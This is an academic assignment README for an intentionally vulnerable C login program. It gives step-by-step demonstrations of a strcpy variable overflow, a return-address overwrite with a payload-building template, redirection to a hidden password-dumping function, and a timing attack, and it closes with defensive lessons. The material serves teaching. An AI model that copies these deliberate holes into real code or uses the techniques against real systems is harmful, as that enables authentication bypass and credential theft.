# Security Engineering - Assignment 6

## Vulnerable Login System in C

This project implements a small vulnerable login system in C.

The purpose of the project is to demonstrate several security attacks that were learned in the Security Engineering course:

1. Bypassing authentication using variable overflow.
2. Bypassing authentication using return address overwrite.
3. Calling a hidden function that prints all usernames and passwords.
4. Recovering a password using a timing attack.

The project is intentionally vulnerable and was written only for academic purposes in a controlled local environment.

---

## Important Running Note

All commands should be executed from the main project folder:

```powershell
cd "C:\Users\orelk\Documents\GitHub\Security Engineering – Assignment 6"
```

To verify that you are in the correct folder:

```powershell
dir
```

If GDB has a problem with the project path because of spaces or special characters, copy the project to a simple folder:

```powershell
mkdir C:\SE6
Copy-Item -Recurse -Force * C:\SE6
cd C:\SE6
```

---

## Project Structure

```txt
Security Engineering - Assignment 6/
│
├── src/
│   ├── server.c
│   └── timing_attack.c
│
├── data/
│   └── users.txt
│
├── payloads/
│   ├── variable_overflow_payload.txt
│   ├── return_address_payload.txt
│   ├── crash_payload.bin
│   └── notes.txt
│
├── docs/
│   ├── README.md
│   └── video_script.md
│
└── bin/
```

Commands to show the project structure:

```powershell
dir
dir src
dir data
dir payloads
dir docs
```

Command to show the users file:

```powershell
type data\users.txt
```

---

## Files Explanation

### src/server.c

This is the main vulnerable program.

It includes:

* User registration.
* Normal login.
* Reading users from a file.
* A hidden `dump_users` function.
* Variable overflow demonstration.
* Return address overwrite demonstration.
* Timing vulnerable login.
* Command mode for timing checks.

The program prints important function addresses when it starts:

* `authenticated_area`
* `dump_users`
* `win_authenticated`
* `win_dump_users`

---

### src/timing_attack.c

This file demonstrates the timing attack.

It runs the vulnerable server in command mode and sends password guesses.

For every guess, it reads the time returned by the server.

Because the vulnerable comparison waits after each correct character, a guess with a longer correct prefix takes more time.

The program uses that information to recover the password one character at a time.

---

### data/users.txt

This file stores usernames and passwords.

Each line has this format:

```txt
username:password
```

Example:

```txt
admin:secret
```

Command to display the file:

```powershell
type data\users.txt
```

---

## Compilation

Before compiling, make sure the `bin` folder exists:

```powershell
mkdir bin
```

If it already exists, PowerShell may print an error. That is fine.

Compile the vulnerable server:

```powershell
gcc src/server.c -o bin/server -g -O0 -fno-stack-protector -fno-omit-frame-pointer -no-pie
```

Compile the timing attack program:

```powershell
gcc src/timing_attack.c -o bin/timing_attack -g -O0
```

Check that the compiled files were created:

```powershell
dir bin
```

---

## Running the Vulnerable Server

Run the server:

```powershell
./bin/server
```

Expected behavior:

The program opens a menu:

```txt
========== Vulnerable Login System ==========
1. Register
2. Normal login
3. Variable overflow login
4. Return address overwrite demo
5. Timing vulnerable login
6. Exit
Choose option:
```

The program also prints target function addresses:

```txt
authenticated_area address: ...
dump_users address: ...
win_authenticated address: ...
win_dump_users address: ...
```

These addresses are used during the return address overwrite demonstration.

---

## Normal Login Demonstration

Run the server:

```powershell
./bin/server
```

Choose normal login:

```txt
2
```

Enter a correct username and password:

```txt
admin
secret
```

Expected result:

```txt
Authentication passed.
Welcome to the protected area.
```

Now test a wrong password.

Choose normal login again:

```txt
2
```

Enter:

```txt
admin
wrong
```

Expected result:

```txt
Login failed.
```

This shows the normal behavior of the system.

---

# Attack 1: Variable Overflow

## Explanation

The vulnerable struct is:

```c
struct LoginData {
    char password[16];
    int authenticated;
};
```

The `authenticated` variable is initialized to 0.

The vulnerable line is:

```c
strcpy(data.password, user_input);
```

The problem is that `strcpy` does not check if the input fits inside the destination buffer.

When the input is longer than 16 bytes, it overflows from the `password` buffer into the `authenticated` variable.

---

## Running a Normal Input

Run the server:

```powershell
./bin/server
```

Choose option 3:

```txt
3
```

Enter a short input:

```txt
abc
```

Expected result:

```txt
Before input: authenticated = 0
After input: authenticated = 0
Access denied.
```

---

## Running the Variable Overflow Payload

Run the server:

```powershell
./bin/server
```

Choose option 3:

```txt
3
```

Enter the payload:

```txt
AAAAAAAAAAAAAAAAA
```

This payload contains 17 characters of `A`.

The password buffer is 16 bytes.

The 17th character overflows into the `authenticated` variable.

The ASCII value of `A` is 65, so `authenticated` becomes 65.

Expected result:

```txt
Before input: authenticated = 0
After input: authenticated = 65
Authentication passed.
Welcome to the protected area.
```

This means the program entered the protected area without knowing the real password.

---

## Debugger Demonstration for Variable Overflow

Open the server in GDB:

```powershell
gdb ./bin/server
```

Inside GDB, set a breakpoint:

```gdb
break variable_overflow_login
```

Run the program:

```gdb
run
```

When the menu appears, choose option 3:

```txt
3
```

GDB should stop at the breakpoint.

Disassemble the function:

```gdb
disassemble variable_overflow_login
```

Show the addresses of the local variables:

```gdb
print &data
print &data.password
print &data.authenticated
```

If GDB does not recognize `data` immediately, use:

```gdb
next
next
print &data
print &data.password
print &data.authenticated
```

Continue the program:

```gdb
continue
```

Enter the overflow payload:

```txt
AAAAAAAAAAAAAAAAA
```

Exit GDB:

```gdb
quit
```

If GDB asks whether to quit anyway, answer:

```txt
y
```

---

# Attack 2: Return Address Overwrite

## Explanation

The vulnerable function is:

```c
return_address_vulnerable
```

It contains a local stack buffer:

```c
char buffer[64];
```

The vulnerable copy is:

```c
memcpy(buffer, input, input_len);
```

The problem is that `memcpy` copies the number of bytes it receives.

If `input_len` is larger than 64, the payload can overwrite data after the local buffer on the stack.

This can overwrite the saved return address.

The general payload structure is:

```txt
padding bytes + target function address
```

In this project, the clean target functions are:

```c
win_authenticated()
win_dump_users()
```

`win_authenticated()` calls the protected area and exits.

`win_dump_users()` calls `dump_users()` and exits.

---

## Creating a Crash Payload

This payload is used to demonstrate that the stack buffer can be overflowed.

Create the payload file:

```powershell
python -c "open('payloads/crash_payload.bin','wb').write(b'A'*100)"
```

Check that it was created:

```powershell
dir payloads
```

---

## Running the Return Address Demo

Run the server:

```powershell
./bin/server
```

Choose option 4:

```txt
4
```

When the program asks for a payload file path, enter:

```txt
payloads/crash_payload.bin
```

Expected behavior:

The program reads 100 bytes from the payload file and copies them into a 64 byte local buffer.

This demonstrates the vulnerable copy and prepares the explanation for return address overwrite.

---

## Debugger Demonstration for Return Address Overwrite

Open the server in GDB:

```powershell
gdb ./bin/server
```

Inside GDB, set a breakpoint:

```gdb
break return_address_vulnerable
```

Run the program:

```gdb
run
```

When the menu appears, choose option 4:

```txt
4
```

When the program asks for a payload file path, enter:

```txt
payloads/crash_payload.bin
```

GDB should stop at the vulnerable function.

Disassemble the function:

```gdb
disassemble return_address_vulnerable
```

Show the target function addresses:

```gdb
print win_authenticated
print win_dump_users
print authenticated_area
print dump_users
```

Show the buffer address:

```gdb
print &buffer
```

Show the current stack frame:

```gdb
info frame
```

Inspect the stack:

```gdb
x/24gx $rsp
```

Continue the program:

```gdb
continue
```

The goal of this part is to explain how the payload is built:

1. Fill the buffer.
2. Continue filling until the saved return address.
3. Replace the saved return address with the address of a target function such as `win_authenticated` or `win_dump_users`.

Exit GDB:

```gdb
quit
```

If GDB asks whether to quit anyway, answer:

```txt
y
```

---

## Optional Final Payload Structure

The final payload depends on:

* The offset from the local buffer to the saved return address.
* The target function address printed by the program or by GDB.
* The system architecture and compiler behavior.

General structure:

```txt
'A' repeated OFFSET times + target address in little endian
```

Example template:

```powershell
python -c "import struct; OFFSET=72; ADDRESS=0x0000000000400000; open('payloads/final_payload.bin','wb').write(b'A'*OFFSET + struct.pack('<Q', ADDRESS))"
```

Important:

Replace `OFFSET` and `ADDRESS` with the values found in the debugger.

Then run:

```powershell
./bin/server
```

Choose option 4:

```txt
4
```

Enter:

```txt
payloads/final_payload.bin
```

---

# Attack 3: Calling the Hidden dump_users Function

## Explanation

The program contains a hidden function named:

```c
dump_users()
```

This function opens and prints:

```txt
data/users.txt
```

The function is not available as a regular menu option.

However, it still exists in memory and has an address.

If the program flow is redirected to `win_dump_users`, it calls `dump_users` and prints all saved usernames and passwords.

This demonstrates that hidden functions are still dangerous when a memory corruption vulnerability exists.

---

## Showing That dump_users Is Not in the Menu

Run the server:

```powershell
./bin/server
```

Look at the menu:

```txt
1. Register
2. Normal login
3. Variable overflow login
4. Return address overwrite demo
5. Timing vulnerable login
6. Exit
```

There is no regular option called `dump_users`.

Exit:

```txt
6
```

---

## Showing the dump_users Target Address

Run the server:

```powershell
./bin/server
```

At startup, the program prints:

```txt
dump_users address: ...
win_dump_users address: ...
```

These addresses show that the function exists in memory even though it is hidden from the menu.

Exit:

```txt
6
```

---

## Showing dump_users in GDB

Open GDB:

```powershell
gdb ./bin/server
```

Print the function address:

```gdb
print dump_users
print win_dump_users
```

Disassemble the hidden function:

```gdb
disassemble dump_users
```

Exit GDB:

```gdb
quit
```

If GDB asks whether to quit anyway, answer:

```txt
y
```

---

# Attack 4: Timing Attack

## Explanation

The timing vulnerability is caused by an insecure password comparison.

The comparison checks the password character by character.

If a wrong character is found, the function returns immediately.

If a character is correct, the function waits using:

```c
usleep(80000);
```

Because of that, guesses with more correct characters at the beginning take more time.

---

## Manual Timing Leak Demonstration

Run one manual timing check:

```powershell
./bin/server timing admin s
```

Example output:

```txt
result=0
time=84039
```

Run another timing check with a longer correct prefix:

```powershell
./bin/server timing admin se
```

Example output:

```txt
result=0
time=176824
```

Run another timing check:

```powershell
./bin/server timing admin sec
```

The time should grow as the correct prefix becomes longer.

This shows that response time leaks information about the password.

---

## Running the Timing Attack Program

Run the attack program:

```powershell
./bin/timing_attack
```

When it asks for a username, enter:

```txt
admin
```

The program will try possible characters one by one.

For every guess, it measures the response time.

The guess with the longest response time is probably the correct next character.

Expected final result:

```txt
Password found: secret
```

---

# Video Demonstration Checklist

The video should include:

1. Showing the project structure.
2. Showing `server.c` and `timing_attack.c`.
3. Compiling the project.
4. Running the server.
5. Showing successful login.
6. Showing failed login.
7. Demonstrating variable overflow.
8. Using GDB on `variable_overflow_login`.
9. Disassembling `variable_overflow_login`.
10. Demonstrating the return address overwrite function.
11. Using GDB on `return_address_vulnerable`.
12. Disassembling `return_address_vulnerable`.
13. Showing the addresses of `win_authenticated` and `win_dump_users`.
14. Explaining how the return address payload is built.
15. Showing that `dump_users` is hidden from the menu.
16. Showing that `dump_users` exists in memory.
17. Demonstrating manual timing leak.
18. Running the full timing attack program.
19. Showing the recovered password.
20. Explaining the security lessons.

---

# Security Lessons

The main security lessons are:

* Do not use unsafe copy functions without size checks.
* Do not copy payloads into fixed-size buffers without validating length.
* Do not store passwords as clear text.
* Do not rely on hidden functions as a security mechanism.
* Use constant-time password comparison.
* Compile real programs with stack protection and memory protections enabled.
* Validate input length before copying data into memory.

---

# Video Link

The video demonstration for this assignment is available here:

[Video Demonstration Link](https://drive.google.com/drive/folders/1nJrJ9ARy3u8fXap6LmI07tSfBxVG5TeV?usp=sharing)

